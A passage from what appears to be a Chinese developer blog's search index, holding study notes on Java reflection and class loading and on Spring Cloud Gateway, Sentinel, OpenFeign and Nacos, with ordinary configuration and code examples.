switch (key){ case \u0026#34;1\u0026#34; : Dog dog = new Dog(); //静态加载，编译时直接报错，依赖性强 dog.cry(); break; case \u0026#34;2\u0026#34;: //反射---\u0026gt;动态加载 Class\u0026lt;?\u0026gt; cls = Class.forName(\u0026#34;Dog\u0026#34;); //动态加载，编译时可通过，运行时没用该类才会报错 Object o = cls.newInstance(); Method method = cls.getMethod(\u0026#34;h1\u0026#34;); method.invoke(o); break; default: System.out.println(\u0026#34;do nothing....\u0026#34;); } } } 3.2.类加载流程图 类加载每个阶段需要干的事\n3.3.类加载5个阶段 3.3.1.加载阶段 JVM在该阶段的主要目的是将字节码从不同的数据源（可能是class文件、也可能是jar包，甚至网络)转化为二进制字节流加载到内存中，并生成一个代表该类的java.lang.Class对象\n3.3.2.连接阶段 验证阶段 目的是确保当前Class文件的字节流中包含的信息符合当前虚拟机的要求，并且不会危害虚拟机自身安全\n包括：文件格式验证（是否以魔数 0xcafebabe开头）,元数据验证，字节码验证和符号引用验证\n可以考虑使用-X verify:none参数来关闭大部分类验证措施，缩短虚拟机类加载的时间\n准备阶段 1 2 3 4 5 6 7 8 class A{ //1.n1是实例变量，不是静态变量，因此在准备阶段，是不会分配内存的 //2.n2是静态变量，准备阶段需要分配内存，n2的默认值为0，而不是20，20是在初始化阶段进行赋值的 //3.n3是常量，他和静态变量不一样，因为一旦赋值就不变，n3 = 30 public int n1 = 10; public static int n2 = 20; public static final int n3 = 30; } 解析阶段 虚拟机将常量池内的符号引用替换为直接引用的过程\n3.3.3.初始化阶段 到初始化阶段才真正开始执行类中定义的Java程序代码，此阶段是执行()方法的过程。\n()方法由编译器**按语句在源文件中出现的顺序，依次收集类中所有静态变量的赋值动作和静态代码块中**的语句，并进行合并\n虚拟机会保证一个类的()方法在多线程环境中被正确的加锁，同步，如果多个线程同时去初始化一个类，那么只会有一个线程去执行这个类的()方法\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 package com.edu.ClassLoad; /* * 类加载初始化阶段 * */ public class ClassLoad3 { public static void main(String[] args) { //1.加载B类，并生成 B的class对象 //2.连接 num = 0; //3.初始化阶段：依次收集类中所有静态变量的赋值动作和静态代码块中的语句,并合并 //client(){ // static { // System.out.println(\u0026#34;B 的静态代码块被执行\u0026#34;); // num = 300; // num = 100; // } //合并之后num=100 // } //new B(); System.out.println(B.num); } } class B{ static { System.out.println(\u0026#34;B 的静态代码块被执行\u0026#34;); num = 300; } static int num = 100; public B(){ //构造器不会执行，除非你new 了B这个对象才会执行 System.out.println(\u0026#34;B 的构造器被执行\u0026#34;); } } ","date":"2025-06-09T12:42:31+08:00","image":"https://lserein.github.io/p/java%E5%8F%8D%E5%B0%84/logo_hu_73624af09b12cc7e.png","permalink":"https://lserein.github.io/p/java%E5%8F%8D%E5%B0%84/","title":"Java反射"},{"content":"\n1.创建网关模块 1 2 3 4 5 6 7 8 9 10 \u0026lt;dependencies\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.cloud\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-cloud-starter-gateway\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba.cloud\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-cloud-starter-alibaba-nacos-discovery\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;/dependencies\u0026gt; 2.配置规则 需**求1：客户端发送/api/order/转到service-order\n**需求2：客户端发送/api/product/转到service-product\n需求3：以上转发均有负载均衡效果\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 spring: cloud: gateway: routes: # - id: service_a - id: order-route uri: lb://service-order predicates：当请求路径以 /api/product/ 开头时，请求会被路由到 service-product 服务: # - Path=/service-a/** - Path=/api/order/** - id: product-route uri: lb://serivce-product predicates: # - Path=/service-a/** - Path=/api/product/** //id：唯一标识这个路由规则 //uri：lb://service-order //表示使用 Spring Cloud LoadBalancer 进行客户端负载均衡 //service-order是服务注册中心中的服务名 //predicates：当请求路径以 /api/product/ 开头时，请求会被路由到 service-product 服务 这些路由规则有自己的执行循序：默认从上往下执行，如果想要执行更快可以使用order: 1规定执行顺序 1 2 3 4 5 6 7 8 9 10 11 12 - id: bingo-route # 路由的唯一标识符 uri: https://www.bing.com # 目标URL（直接转发到Bing） predicates: # 路由匹配条件 - name: Path # 第一个条件：路径匹配 args: pattern: /search # 只匹配以/search开头的路径 - name: Query # 第二个条件：查询参数匹配 args: param: q # 检查名为\u0026#34;q\u0026#34;的查询参数 regex: haha # 该参数值必须匹配正则表达式\u0026#34;haha\u0026#34; 这个规则表示只有请求路径为：search?q=haha请求才会被转发到bing.com中 2.1.自定义断言工厂 1.一个类的名字要写成xxxRoutePredicateFactory.Config，并且要继承AbstractRoutePredicateFactory，泛型为类名\n2.必须重写父类的shortcutFieldOrder和apply方法，apply方法代码逻辑主要写业务代码逻辑\n如以下代码是判断用户是否为vip用户的业务逻辑\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 package com.example.gateway.predicate; import jakarta.validation.constraints.NotEmpty; import org.springframework.cloud.gateway.handler.predicate.AbstractRoutePredicateFactory; import org.springframework.cloud.gateway.handler.predicate.GatewayPredicate; import org.springframework.http.server.reactive.ServerHttpRequest; import org.springframework.stereotype.Component; import org.springframework.util.StringUtils; import org.springframework.web.server.ServerWebExchange; import java.util.Arrays; import java.util.List; import java.util.function.Predicate; @Component public class VipRoutePredicateFactory extends AbstractRoutePredicateFactory\u0026lt;VipRoutePredicateFactory.Config\u0026gt; { public VipRoutePredicateFactory() { super(Config.class); } @Override public List\u0026lt;String\u0026gt; shortcutFieldOrder() { return Arrays.asList(\u0026#34;param\u0026#34;,\u0026#34;value\u0026#34;); } @Override public Predicate\u0026lt;ServerWebExchange\u0026gt; apply(Config config) { return new GatewayPredicate() { @Override public boolean test(ServerWebExchange exchange) { //localhost/search?q=haha\u0026amp;user=Lsec ServerHttpRequest request = exchange.getRequest(); String first = request.getQueryParams().getFirst(config.getParam()); if (StringUtils.hasText(first) \u0026amp;\u0026amp; first.equals(config.getValue())) { return true; } return false; } }; } /* * 可以配置的参数 * */ public static class Config{ @NotEmpty private String param; @NotEmpty private String value; public String getParam() { return param; } public void setParam(String param) { this.param = param; } public String getValue() { return value; } public void setValue(String value) { this.value = value; } } } //配置文件规则 - name: Vip args: param: user value: Lsec 3.Filter过滤器 3.1.过滤器Filter基本使用 **路径重写Filter：**RewritePath，什么是路径重写，当你想使用/api/product这个基准路径访问业务时，需要在product模块的controller层代码添加对应的基准路径，有时你会觉得不方便，如果使用路径重写filter，你就可以不用在controller层添加基准路径的api，直接访问即可\n1 2 3 4 5 6 7 8 9 - id: product-route uri: lb://serivce-product predicates: # - Path=/service-a/** - Path=/api/product/** filters: - RewritePath=/api/product/?(?\u0026lt;segment\u0026gt;.*),/$\\{segment} //修改请求的路径后再转发到目标服务 //请求 /api/product/123 → 重写为 /123 → 转发到 service-product/123 //请求 /api/product/items → 重写为 /items → 转发到 service-product/items **添加请求头响应头Filter：**AddRequestHeader/AddResponseHeader\n1 2 3 4 5 6 7 8 9 10 11 12 spring: cloud: gateway: routes: # - id: service_a - id: order-route uri: lb://service-order predicates: # - Path=/service-a/** - Path=/api/order/** filters: - RewritePath=/api/order/?(?\u0026lt;segment\u0026gt;.*),/$\\{segment} - AddRequestHeader=X-Response-ABC, 123 - AddResponseHeader=X-Response-Foo, Bar 就是在请求包中添加请求头和响应头\n3.2.默认Filter 如果你的路由没有写Filter，但是存在默认Filter，路由默认会使用这个Filter\n1 2 3 4 5 default-filters: - name: AddRequestHeader args: name: X-Request-Foo value: Bar 3.3.全局Filter 想要实现全局filter，需要在实现GlobalFilter，并且重写filter方法\n下面是一个计算请求时间的全局过滤器\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 package com.example.gateway.filter; import lombok.extern.slf4j.Slf4j; import org.slf4j.Logger; import org.slf4j.LoggerFactory; import org.springframework.cloud.gateway.filter.GatewayFilterChain; import org.springframework.cloud.gateway.filter.GlobalFilter; import org.springframework.http.server.reactive.ServerHttpRequest; import org.springframework.http.server.reactive.ServerHttpResponse; import org.springframework.stereotype.Component; import org.springframework.web.server.ServerWebExchange; import reactor.core.publisher.Mono; @Slf4j @Component public class RtGlobalFilter implements GlobalFilter { @Override public Mono\u0026lt;Void\u0026gt; filter(ServerWebExchange exchange, GatewayFilterChain chain) { ServerHttpRequest request = exchange.getRequest(); ServerHttpResponse response = exchange.getResponse(); String uri = request.getURI().toString(); long start = System.currentTimeMillis(); log.info(\u0026#34;请求开始，uri：{},时间：{}ms\u0026#34;, uri, start); /*==============================================*/ Mono\u0026lt;Void\u0026gt; filter = chain.filter(exchange) .doFinally(result -\u0026gt; { long end = System.currentTimeMillis(); log.info(\u0026#34;请求结束，uri：{},时间：{}ms\u0026#34;, uri, (end - start)); }); return filter; } } 3.4.自定义过滤器工厂 自定义过滤器工厂和自定义断言工厂一样，可以看Spring Cloud自带的过滤器工厂是怎么设置的，根据样式仿写即可\n可以看到系统的工厂需要继承AbstractNameValueGatewayFilterFactory这个父类工厂，并重写apply方法\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 package com.example.gateway.filter; import org.springframework.cloud.gateway.filter.GatewayFilter; import org.springframework.cloud.gateway.filter.factory.AbstractGatewayFilterFactory; import org.springframework.http.HttpHeaders; import org.springframework.http.server.reactive.ServerHttpResponse; import org.springframework.stereotype.Component; import reactor.core.publisher.Mono; import java.util.UUID; @Component public class OnceTokenGatewayFilterFactory extends AbstractGatewayFilterFactory\u0026lt;OnceTokenGatewayFilterFactory.Config\u0026gt; { public OnceTokenGatewayFilterFactory() { super(Config.class); } @Override public GatewayFilter apply(Config config) { return (exchange, chain) -\u0026gt; chain.filter(exchange).then(Mono.fromRunnable(() -\u0026gt; { ServerHttpResponse response = exchange.getResponse(); HttpHeaders headers = response.getHeaders(); String value = config.getValue(); if (value == null || value.isEmpty()) { value = UUID.randomUUID().toString(); // 默认生成 UUID } else if (value.equals(\u0026#34;uuid\u0026#34;)) { value = UUID.randomUUID().toString(); } else if (value.equals(\u0026#34;jwt\u0026#34;)) { value = \u0026#34;jwt_token\u0026#34;; } headers.add(\u0026#34;once-token\u0026#34;, value); })); } public static class Config { private String value; // 移除 @NotEmpty public String getValue() { return value; } public void setValue(String value) { this.value = value; } } } 4.全局跨域（CORS） 4.1.什么是跨域 1 2 3 4 5 6 7 8 spring: cloud: gateway: globalcors: cors-configurations: \u0026#39;[/**]\u0026#39;: # 匹配所有请求 allowedOrigins: \u0026#34;*\u0026#34; #跨域处理 允许所有的域 allowedMethods: \u0026#34;*\u0026#34;# 支持的方法 经典面试题：微服务之间的调用是否经过网关\n默认是不经过网关的，但是也可以经过网关，只需要将远程调用的地址改为网关地址，让网关来发送请求即可\n","date":"2025-06-09T12:30:52+08:00","image":"https://lserein.github.io/p/gateway/gateway_hu_4c187a95a9d45d87.jpg","permalink":"https://lserein.github.io/p/gateway/","title":"Gateway"},{"content":"1.Sentinel工作原理 学习Sentinel关注3点\n1.如何定义资源 2.如何定义规则 3.如何处理规则 2.下载Sentinel客户端 home | Sentinel\n下载连接：https://github.com/alibaba/Sentinel/releases/tag/1.8.8\n1 java -jar sentinel-dashboard-1.8.8.jar 启动后访问127.0.0.1:8080端口，默认账户密码为sentinel:sentinel\n3.Sentinel结合业务 导入Sentinel依赖\n1 2 3 4 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba.cloud\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-cloud-starter-alibaba-sentinel\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; 编辑配置文件连接Sentinel服务器地址\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 spring: cloud: openfeign: client: config: product-service: # 只针对product-service服务的配置 connect-timeout: 5000 # 连接超时时间 read-timeout: 5000 # 读取超时时间 logger-level: full # 日志级别 default: # 所有其它服务的默认配置 connect-timeout: 5000 # 连接超时时间 read-timeout: 10000 # 读取超时时间 logger-level: full # 日志级别 Sentinel: transport: dashboard: localhost:8080 # sentinel控制台地址 eager: true # 启动时就初始化sentinel规则 此时启动项目就连接成功\n那么如何通过Sentinel实现监控呢，在你需要监控的资源上加上@SentinelResource注解表示这个方法是Sentinel监控的资源\n此时如果我们请求这个路由，Sentinel就会接收到这个请求，根据我们在Sentinel上定义的规则对请求进行拦截或放行\n通过Sentinel定义流控规则限制并发数，此时我限制每次发送的请求最多为1次\n当我访问过快时，业务端直接报错\n4.Sentinel异常处理 Web异常自定义处理异常 由于默认的异常处理是Sentinel的默认错误页，如果我们想对这个异常处理进行优化该怎么操作呢\n想要异常处理为自己定义的就要自己写一个BlockExceptionHandler\n在模型层定义一个处理异常的JavaBean，给上构造方法\n定义一个处理异常的类MyExceptionHandler实现BlockExceptionHandler方法，重写里面的handle方法\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 package com.example.exception; import com.alibaba.csp.sentinel.adapter.spring.webmvc_v6x.callback.BlockExceptionHandler; import com.alibaba.csp.sentinel.slots.block.BlockException; import com.example.bean.common.R; import com.fasterxml.jackson.databind.ObjectMapper; import jakarta.servlet.http.HttpServletRequest; import jakarta.servlet.http.HttpServletResponse; import org.springframework.stereotype.Component; import java.io.PrintWriter; @Component public class MyExceptionHandler implements BlockExceptionHandler { private ObjectMapper objectMapper = new ObjectMapper(); @Override public void handle(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, String s, BlockException e) throws Exception { httpServletResponse.setCharacterEncoding(\u0026#34;UTF-8\u0026#34;); httpServletResponse.setContentType(\u0026#34;application/json\u0026#34;); PrintWriter writer = httpServletResponse.getWriter(); R error = R.error(500, \u0026#34;系统繁忙，请稍后再试\u0026#34;); String json = objectMapper.writeValueAsString(error); writer.write(json); } } 4.4.2.@SentinelResource异常处理器 一句话总结：@SentinelResource如果标注了blockhandler注解，那就是由blockhandler处理异常，如果没有标注blockhandler属性标注了fallback属性，那么就是由fallback来处理异常，如果一个属性都没有标只取了个名字，那么异常就会没人管向上抛出，最好由SpringBoot来进行处理\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 //当请求符合Sentinel的要求时，直接走CreateOrder方法并返回真实数据 //当请求不符合Sentinel的规则时，会走blockHandler中的CreateOrderBlockHandler方法，并调用兜底回调 @Override @SentinelResource(value = \u0026#34;createOrder\u0026#34;, blockHandler = \u0026#34;CreateOrderBlockHandler\u0026#34;) public order CreateOrder(Long userId, Long productId) { order order = new order(); product product = productFeignClient.getProductById(productId); //product product = getProductFromRemote2(productId); order.setId(1L); //计算订单总金额 order.setTotalAmount(product.getPrice().multiply(new BigDecimal(\u0026#34;10\u0026#34;))); order.setUserId(userId); order.setNikeName(\u0026#34;zhangsan\u0026#34;); order.setAddress(\u0026#34;beijing\u0026#34;); //远程查询商品信息，并设置到订单中 order.setProductList(Arrays.asList(product)); return order; } public order CreateOrderBlockHandler(Long userId, Long productId, BlockException e) { order order = new order(); order.setId(0L); //计算订单总金额 order.setTotalAmount(new BigDecimal(\u0026#34;0\u0026#34;)); order.setUserId(userId); order.setNikeName(\u0026#34;未知用户\u0026#34;); order.setAddress(\u0026#34;异常信息\u0026#34;+e.getMessage()); return order; } 4.4.3.OpenFeign调用 可以从链路数据中看出链路一直到达OpenFeign远程调用地址，如果我们在远程调用地址上添加流控会发生什么呢\n当请求过快时会看到页面返回OpenFeign兜底回调数据，原因是我们之前在OpenFeign接口上写过兜底回调fallback，如果请求失败并且项目中有兜底数据，那么就会显示兜底数据，如果没有写兜底回调，那么就会往上抛，知道SpringBoot来进行处理\n4.4.4.Sphu硬编码方式处理异常 1 2 3 4 5 6 7 try { SphU.entry(\u0026#34;createOrder\u0026#34;); //项目原生代码 } catch (BlockException e) { //进行异常处理逻辑，比如返回默认值或者抛出异常等 throw new RuntimeException(e); } 5.Sentinel流控规则 阈值类型：QPS和并发线程数的区别\nQPS：指每秒允许通过的请求数量，基于时间窗口统计，底层采用计数器来计数\n并发线程数：适用于代码中使用了线程池，比较复杂，也是每秒运行通过的请求数量\n集群阈值模式：\n单机均摊：假设总请求为30，有3个集群，那么每个集群均摊10个请求\n总体阈值：假设总体阈值请求为10，有3个集群，那么每个集群处理3个请求\n5.1.流控模式（直接/关联/链路） 链路规则 比如有这样一个场景：订单创建时分为普通创建订单和秒杀创建订单两种情况，我在createOrder资源中流控模式选择链路模式，入口资源选择秒杀创建订单资源名，那么当请求过快时，普通创建订单不受影响，秒杀创建订单会加载兜底数据\n关联规则 当系统中两个资源存在竞争关系时通常使用关联规则\n当writedb的流量特别大时，readdb才会被限制\n5.2.流控效果（快速失败/Warm up/排队等待） 快速失败 当请求流量超出阈值规则时，多余的请求直接会抛出异常\nWarm Up（预热/冷启动） 匀速排队 以前超过的请求都是直接丢掉，匀速排队中多出来的请求一个一个排队，当排队市场超过预期时间，请求就会被丢弃\n6.熔断规则 断路器工作原理\n6.1.慢调用比例 解释一下这张图：\n5秒内所有响应超过1秒的请求都为慢调用请求，如果慢调用请求超过总请求的80%，那么这个请求是不可靠的，那么断路器会熔断30S,这30S期间所有请求均返回错误\n6.2.异常比例 5秒内向远程发送请求，如果有80%请求出现异常，那么断路器会打开熔断20秒，这20秒不会在给远程发送请求\n6.3.异常数 5秒内不管你发送多少请求，只要你请求中有10个存在异常，那么就直接触发熔断规则\n7.热点规则 parameter-flow-control | Sentinel\n何为热点？热点即经常访问的数据。很多时候我们希望统计某个热点数据中访问频次最高的 Top K 数据，并对其访问进行限制。比如：\n商品 ID 为参数，统计一段时间内最常购买的商品 ID 并进行限制 用户 ID 为参数，针对一段时间内频繁访问的用户 ID 进行限制 热点参数限流会统计传入参数中的热点参数，并根据配置的限流阈值与模式，对包含热点参数的资源调用进行限流。热点参数限流可以看做是一种特殊的流量控制，仅对包含热点参数的资源调用生效。\n1 2 3 普通用户秒杀QPS不超过1 vip用户秒杀QPS不限制 666号是下架商品，不允许访问 参数索引这第一个0方法签名的表示第一个参数，单机阈值表示参数的个数\n高级选项中参数值为6表示userId为6的用户不限流\n当服务重启后Sentinel中的所有规则都会失效，如果想要持久化，可以结合Nacos和Mysql数据库实现持久化\n","date":"2025-06-08T23:44:41+08:00","image":"https://lserein.github.io/p/sentinel/Sentinel_hu_2c5df63c709ebee8.jpg","permalink":"https://lserein.github.io/p/sentinel/","title":"Sentinel"},{"content":"OpenFeign\u0026mdash;远程调用 使用OpenFeign进行远程调用 向第三方微服务API发送请求 小Tips：向自己的业务API发送请求直接复制对方业务Controller层方法即可\n前面使用的是restTemplate进行远程调用，但是使用restTemplate进行远程调用比较麻烦，这里我们使用OpenFeign改写代码\n导入依赖，创建ProductFeignClient接口\n1 2 3 4 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.cloud\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-cloud-starter-openfeign\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 restTemplate package com.example.feign; import com.example.bean.product; import org.springframework.cloud.openfeign.FeignClient; import org.springframework.web.bind.annotation.GetMapping; import org.springframework.web.bind.annotation.PathVariable; @FeignClient(value = \u0026#34;product-service\u0026#34;) //Feign客户端，指定要请求的服务名称 public interface ProductFeignClient { //MVC注解两套逻辑 //标注在controller上，是接收http请求 //标注在feign上，是用来发送http请求 @GetMapping(\u0026#34;/product/{productId}\u0026#34;) //指定远程服务接口 product getProductById(@PathVariable(\u0026#34;productId\u0026#34;) Long productId); } 将ProductFeignClient进行依赖注入\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 @Autowired ProductFeignClient productFeignClient; @Override public order CreateOrder(Long userId, Long productId) { order order = new order(); //调用接口的方法发送请求 product product = productFeignClient.getProductById(productId); //不需要自己在写getProductFromRemote2方法 //product product = getProductFromRemote2(productId); order.setId(1L); //计算订单总金额 order.setTotalAmount(product.getPrice().multiply(new BigDecimal(\u0026#34;10\u0026#34;))); order.setUserId(userId); order.setNikeName(\u0026#34;zhangsan\u0026#34;); order.setAddress(\u0026#34;beijing\u0026#34;); //远程查询商品信息，并设置到订单中 order.setProductList(Arrays.asList(product)); return order; } 第三方API远程调用 比如我不需要像注册中心发请求，我想像第三方API发送请求，如：墨迹天气等等\n使用FeignClient绑定第三方API的URL，根据对应请求方法发送对应请求\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 package com.example.feign; import org.springframework.cloud.openfeign.FeignClient; import org.springframework.web.bind.annotation.GetMapping; import org.springframework.web.bind.annotation.RequestParam; //https://v.api.aa1.cn/api/api-tianqi-3/index.php?msg=%E5%A4%A9%E6%B4%A5\u0026amp;type=1 @FeignClient(value = \u0026#34;weather\u0026#34;,url = \u0026#34;https://v.api.aa1.cn/api/api-tianqi-3/index.php\u0026#34;) public interface WeatherFeignClient { @GetMapping(\u0026#34;/api/api-tianqi-3/index.php\u0026#34;) String getWeather(@RequestParam(\u0026#34;msg\u0026#34;) String msg, @RequestParam(\u0026#34;type\u0026#34;) String type); } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 package com.example; import com.example.feign.WeatherFeignClient; import org.junit.jupiter.api.Test; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.boot.test.context.SpringBootTest; @SpringBootTest public class WeatherTest { @Autowired WeatherFeignClient weatherFeignClient; @Test void test(){ String weather = weatherFeignClient.getWeather(\u0026#34;北京\u0026#34;, \u0026#34;1\u0026#34;); System.out.println(weather); } } 客户端负载均衡与服务端负载均衡？\nOpenFeign进阶配置 开启请求日志功能 在yml配置文件中配置日志的范围\n1 2 3 logging: level: com.example.feign: debug 在config配置类中配置一个Bean\n1 2 3 4 @Bean Logger.Level feignLoggerLevel() { return Logger.Level.FULL; } 再次运行测试类，请求的详细信息（请求方法，路径，参数都会展示）\n超时控制 超时有两种超时，连接超时（默认10秒）和读取超时（默认60秒）\n可以新创建一个配置文件，如果其它配置文件想要使用这个配置文件的话只需要引用即可\n1 2 3 4 5 6 7 8 9 10 11 12 13 spring: cloud: openfeign: client: config: product-service: # 只针对product-service服务的配置 connect-timeout: 10000 # 连接超时时间 read-timeout: 10000 # 读取超时时间 logger-level: full # 日志级别 default: # 所有其它服务的默认配置 connect-timeout: 20000 # 连接超时时间 read-timeout: 30000 # 读取超时时间 logger-level: full # 日志级别 重试机制 在config配置类中自定义一个重试器retryer，Spring提供默认的retryer，默认最大重试5次，每次最大间隔1秒\n1 2 3 4 5 @Bean Retryer retryer() { //最多重试3次，每次最大间隔10秒，最小间隔1秒 return new Retryer.Default(1000, 10000, 3); } 拦截器 创建好后可以将这个拦截器在配置文件中声明也可以将它设置为Bean，自动调用拦截\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 package com.example.interceptor; import feign.RequestInterceptor; import feign.RequestTemplate; import org.springframework.stereotype.Component; import java.util.UUID; @Component public class TokenRequestInterceptor implements RequestInterceptor { /* * 请求拦截器需要实现RequestInterceptor接口的apply方法 * 该方法会在请求发送之前被调用 * 可以在该方法中添加请求头、请求参数等 * 这里我们可以通过RequestTemplate对象来添加请求头 * 例如：requestTemplate.header(\u0026#34;Authorization\u0026#34;, \u0026#34;Bearer \u0026#34; + token); * */ @Override public void apply(RequestTemplate requestTemplate) { System.out.println(\u0026#34;拦截器执行了\u0026#34;); requestTemplate.header(\u0026#34;Authorization\u0026#34;, UUID.randomUUID().toString()); } } Fallback兜底返回 使用Fallback兜底返回机制需要引入sentinel依赖\n1 2 3 4 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba.cloud\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-cloud-starter-alibaba-sentinel\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; 在配置文件中将feign.sentinel.enable设置为true\n1 2 3 feign: sentinel: enabled: true # 开启feign对sentinel的支持 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 package com.example.feign.fallback; import com.example.bean.product; import com.example.feign.ProductFeignClient; import org.springframework.stereotype.Component; import java.math.BigDecimal; @Component public class ProductFeignClientFallback implements ProductFeignClient { @Override public product getProductById(Long productId) { System.out.println(\u0026#34;兜底回调\u0026#34;); product product = new product(); product.setId(productId); product.setProductName(\u0026#34;兜底回调商品\u0026#34;); product.setPrice(new BigDecimal(\u0026#34;1000.00\u0026#34;)); product.setNum(10); return product; } } 如果正常请求无法完成请求，那么会走兜底回调方法，返回默认数据\n","date":"2025-06-08T15:08:01+08:00","image":"https://lserein.github.io/p/openfeign/OpenFeign_hu_f854ac1c3ea4ac46.jpg","permalink":"https://lserein.github.io/p/openfeign/","title":"OpenFeign"},{"content":"Nacos\u0026mdash;注册中心\u0026amp;配置中心 Nacos官网| Nacos 配置中心 | Nacos 下载| Nacos 官方社区\n什么是注册中心Nacos Nacos两大核心功能：服务注册与服务发现\n安装Nacos https://nacos.io/download/release-history/?spm=5238cd80.2ef5001f.0.0.3f613b7c4NDiBh\n直接下载zip压缩包，解压后运行即可\n1 startup.cmd -m standalone 访问:http://127.0.0.1:8848/nacos\nNacos服务注册功能 启动微服务 在service-order微服务模块中写一个SpringBoot的启动类\n创建配置文件application.properties\n1 2 3 spring.application.name=service-order //服务名称 sercer.port=8000 //服务启动端口 spring.cloud.nacos.server-addr=127.0.0.1:8848 //nacos地址 此时访问本地nacos服务器，发现nacos中存在service-order即注册成功\n集群模式启动测试 控制台右键复制配置\n编辑配置，将端口改一下运行即可，如下图所示\n此时nacos注册中心实例数就有3个了\nNacos服务发现 开启服务发现功能 在SpringBoot的启动类中添加注解@EnableDiscoveryClient\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 package com.example; import org.springframework.boot.SpringApplication; import org.springframework.boot.autoconfigure.SpringBootApplication; import org.springframework.cloud.client.discovery.EnableDiscoveryClient; @EnableDiscoveryClient //开启服务注册与发现功能 @SpringBootApplication public class ProductApplication { public static void main(String[] args) { SpringApplication.run(ProductApplication.class, args); } } 测试服务发现API 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 @SpringBootTest public class productTest { @Autowired DiscoveryClient discoveryClient; @Test public void discoveryClient() { // 服务注册与发现功能的测试代码 discoveryClient.getServices().forEach(service -\u0026gt; System.out.println(\u0026#34;service\u0026#34;+service) ); //获取服务的IP和端口信息 discoveryClient.getInstances(\u0026#34;product-service\u0026#34;).forEach(instance -\u0026gt; System.out.println(\u0026#34;instance\u0026#34;+instance.getHost()+\u0026#34;\\n\u0026#34;+instance.getPort()+\u0026#34;\\n\u0026#34;+instance.getUri()) ); } } 使用nacosServiceDiscovery进行服务发现测试 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 @Autowired NacosServiceDiscovery nacosServiceDiscovery; //获取服务信息 @Test void nacosServiceDiscovery() throws NacosException { // 服务注册与发现功能的测试代码 nacosServiceDiscovery.getServices().forEach(service -\u0026gt; System.out.println(\u0026#34;service\u0026#34;+service) ); //获取服务的IP和端口信息 nacosServiceDiscovery.getInstances(\u0026#34;product-service\u0026#34;).forEach(instance -\u0026gt; System.out.println(\u0026#34;instance\u0026#34;+instance.getHost()+\u0026#34;\\n\u0026#34;+instance.getPort()) ); } 4.远程调用\u0026mdash;下单场景 远程调用基本流程\n首先要定义两个微服务模块，分别是order模块和product模块，分别在这两个模块中编写对应的逻辑代码，这两个模块不需要写实体类pojo，将所有微服务的实体类抽取出来放到model模块统一管理\norder和product模块要使用实体类直接在pom文件中加载依赖即可，如果不这样做的话如果订单模块要使用product模块就会很麻烦\n负载均衡API测试 根据配置的策略从可用实例中选择一个，默认使用轮询算法，这次调用9001，下次调用9002，在又是9001\n1 2 3 4 5 //在order的pom文件中引入对应依赖 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.cloud\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-cloud-starter-loadbalancer\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 @SpringBootTest public class LoadBalancerTest { LoadBalancerClient loadBalancerClient; @Test public void test(){ ServiceInstance choose = loadBalancerClient.choose(\u0026#34;product-service\u0026#34;); System.out.println(choose.getHost()+\u0026#34;:\u0026#34;+choose.getPort()); ServiceInstance choose1 = loadBalancerClient.choose(\u0026#34;product-service\u0026#34;); System.out.println(choose1.getHost()+\u0026#34;:\u0026#34;+choose1.getPort()); ServiceInstance choose2 = loadBalancerClient.choose(\u0026#34;product-service\u0026#34;); System.out.println(choose2.getHost()+\u0026#34;:\u0026#34;+choose2.getPort()); } } 使用@LoadBanlancer注解完成负载均衡调用 1 2 3 4 5 6 //将注解放到远程调用客户端上即可 @LoadBalanced @Bean public RestTemplate restTemplate() { return new RestTemplate(); } 1 2 3 4 5 6 7 8 9 10 